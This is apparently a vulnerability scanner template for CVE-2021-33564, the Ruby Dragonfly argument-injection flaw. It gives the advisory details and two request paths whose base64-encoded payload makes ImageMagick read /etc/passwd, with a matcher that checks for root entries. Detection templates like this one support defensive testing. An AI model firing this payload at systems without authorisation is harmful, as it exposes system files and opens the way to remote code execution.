id: CVE-2021-33564
info:
  name: Ruby Dragonfly <1.4.0 - Remote Code Execution
  author: 0xsapra
  severity: critical
  description: Ruby Dragonfly before version 1.4.0 has a vulnerability that allows
    attackers to execute arbitrary code by injecting arguments through a crafted URL
    when verify_url is disabled.
  reference:
  - https://zxsecurity.co.nz/research/argunment-injection-ruby-dragonfly/
  - https://github.com/markevans/dragonfly/compare/v1.3.0...v1.4.0
  - https://github.com/markevans/dragonfly/commit/25399297bb457f7fcf8e3f91e85945b255b111b5
  - https://github.com/mlr0p/CVE-2021-33564
  - https://nvd.nist.gov/vuln/detail/CVE-2021-33564
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-33564
    cwe-id: CWE-88
  tags: cve,cve2021,rce,ruby,injection
  metadata:
    impact: The vulnerability in Ruby Dragonfly before 1.4.0 can allow remote attackers
      to execute arbitrary code by exploiting the argument injection flaw in the ImageMagick
      convert utility, thus causing a significant impact on the security of the affected
      systems.
    recommendation: It is recommended to update Ruby Dragonfly to version 1.4.0 or
      later to mitigate the remote code execution vulnerability.
requests:
- method: GET
  path:
  - '{{BaseURL}}/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ=='
  - '{{BaseURL}}/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ=='
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    regex:
    - 'root:.*:0:0:'
